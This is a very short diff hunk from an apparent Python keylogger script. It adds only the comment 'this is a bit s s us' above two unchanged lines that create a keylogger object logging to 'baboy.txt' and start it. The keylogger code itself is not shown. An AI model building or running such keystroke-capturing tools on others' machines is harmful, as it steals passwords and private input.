@@ -23,6 +23,6 @@ class keylogger():
 
 
 
-
+#this is a bit s s us
 ads = keylogger("baboy.txt")
 ads.startLog()
